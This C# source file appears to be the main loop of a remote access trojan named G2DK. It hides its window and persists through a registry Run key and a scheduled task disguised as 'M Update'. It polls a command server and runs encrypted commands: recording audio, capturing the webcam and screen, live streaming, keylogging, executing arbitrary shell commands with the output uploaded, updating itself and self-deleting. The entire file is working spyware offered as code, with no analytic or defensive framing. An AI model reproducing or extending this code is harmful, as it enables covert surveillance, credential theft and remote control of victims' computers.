using G2DK.Functionalities;
using G2DK.Functionalities.Livestream;
using G2DK.Utilities;
using Gma.System.MouseKeyHook;
using Imagekit.Sdk;
using Microsoft.Win32;
using Newtonsoft.Json;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;

class Program
{
    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hwnd, int nCmdShow);

    const int SW_HIDE = 0;
    private static CancellationTokenSource cts = new CancellationTokenSource();
    private static Mutex _mutex;
    private static Livestream livestream = new Livestream();

    static async Task Main()
    {
        try
        {
            HideWindow();
            AddToStartup();
            AddWatchdog();

            const string mutexName = "Global\\SingletonInstance";
            _mutex = new Mutex(true, mutexName, out bool createdNew);
            if (!createdNew)
            {
                Environment.Exit(0);
                return;
            }

            await Communication.Register(10);
            Random random = new Random();

            _ = Task.Run(async () =>
            {
                while (!cts.IsCancellationRequested)
                {
                    await Communication.GetCommands();
                    await Communication.Register(1);
                    //int delay = random.Next(30, 301);
                    await Task.Delay(3 * 1000);
                }
            }, cts.Token);
            _ = Task.Run(() => Polling(cts.Token), cts.Token);

            await Task.Delay(Timeout.Infinite);
        }
        catch (Exception e)
        {
            //Console.WriteLine(e.Message);
            _mutex.ReleaseMutex();
            _mutex.Dispose();
        }
    }

    private static void HideWindow()
    {
        IntPtr handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);
    }

    private static void AddToStartup()
    {
        string executablePath = Assembly.GetExecutingAssembly().Location;
        RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
        key.SetValue(Provider.APP, executablePath);
    }

    private static void RemoveFromStartup()
    {
        string executablePath = Assembly.GetExecutingAssembly().Location;
        RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
        key.DeleteValue(Provider.APP, false);
    }

    public static void CleanUp()
    {
        try
        {
            RemoveFromStartup();
        }
        catch { }
    }

    private static void Destroy()
    {
        CleanUp();

        string deleteScript = Path.Combine(Path.GetTempPath(), "destroy.bat");
        string content = $@"
@ECHO OFF
TIMEOUT /T 2 /NOBREAK > NUL
:Repeat
DEL ""{Provider.exe}""
IF EXIST ""{Provider.exe}"" (
    TIMEOUT /T 1 /NOBREAK > nul
    GOTO Repeat
)
DEL ""{deleteScript}""
";
        File.WriteAllText(deleteScript, content);
        Process.Start(new ProcessStartInfo
        {
            FileName = deleteScript,
            CreateNoWindow = true,
            UseShellExecute = false,
            WorkingDirectory = Path.GetDirectoryName(Provider.exe)
        });

        _mutex.ReleaseMutex();
        _mutex.Dispose();
        Environment.Exit(0);
    }

    private static void AddWatchdog()
    {
        const string taskName = "M Update";

        // Get full path to the currently running executable
        string exePath = Assembly.GetExecutingAssembly().Location;

        // Properly quote the executable path for schtasks
        string quotedExePath = $"\"{exePath}\"";

        // 1. Check if the task already exists
        var queryInfo = new ProcessStartInfo
        {
            FileName = "schtasks",
            Arguments = $"/query /tn \"{taskName}\"",
            RedirectStandardError = true,
            RedirectStandardOutput = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };

        using (var queryProcess = Process.Start(queryInfo))
        {
            queryProcess.WaitForExit();

            // 2. If it doesn't exist, create it
            if (queryProcess.ExitCode != 0)
            {
                var createInfo = new ProcessStartInfo
                {
                    FileName = "schtasks",
                    Arguments =
                        $"/create /f /sc hourly /mo 5 /tn \"{taskName}\" " +
                        $"/tr {quotedExePath}",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                Process.Start(createInfo);
            }
        }
    }

    private async static Task Polling(CancellationToken token)
    {
        try
        {
            while (!token.IsCancellationRequested)
            {
                await Communication.Signal.WaitAsync();
                if (Communication.commands.TryDequeue(out Communication.Command command))
                {
                    string cmd = Encryption.Decrypt(command.Cmd);
                    //Console.WriteLine($"Command: {cmd}");

                    string extra = null;
                    if (command.Extra != null)
                    {
                        extra = Encryption.Decrypt(command.Extra);
                        //Console.WriteLine($"Extra: {extra}\n\n");
                    }

                    byte[] image = null;
                    string type = null;
                    switch (cmd.ToLower())
                    {
                        case "audio":
                            if (int.TryParse(extra, out int duration))
                            {
                                byte[] wavData = await Audio.CaptureAsync(duration * 1000);
                                await Communication.UploadAudio(wavData, 20);
                            }
                            break;
                        case "startstream":
                            if (int.TryParse(extra, out int session))
                            {
                                await livestream.Start(false, session, new CancellationTokenSource());
                            }
                            break;
                        case "stopstream":
                            livestream.Stop();
                            break;
                        case "update":
                            Provider.Update(command.Extra);
                            break;
                        case "delete":
                            Destroy();
                            break;
                        case "webcam":
                            image = Webcam.Capture();
                            break;
                        case "screen":
                            image = ScreenCapture.Capture();
                            break;
                        case "startkeylog":
                            Keylogger.Start();
                            break;
                        case "stopkeylog":
                            Keylogger.Stop();
                            break;
                        case "getkeys":
                            string keyData = Keylogger.GetCapturedKeys();
                            if (!string.IsNullOrEmpty(keyData))
                            {
                                await Communication.UploadKeylogs(keyData, command.Id, 10);
                            }
                            break;
                        case "shell":
                            //Console.WriteLine("SHELLLLLLLLLL");
                            string output = await Shell.ExecuteCommand(extra);
                            //Console.WriteLine($"Command output: {output}");
                            if (!string.IsNullOrEmpty(output))
                            {
                                await Communication.UploadShellOutput(output, command.Id, 10);
                            }
                            break;
                        default:
                            break;
                    }

                    if (image != null)
                    {
                        type = cmd.ToLower();
                        await Communication.UploadImage(image, command.Id, type, 10);
                    }
                }
            }
        }
        catch (Exception e)
        {
            //Console.WriteLine($"HEREEE: {e.Message}");
        }
    }
}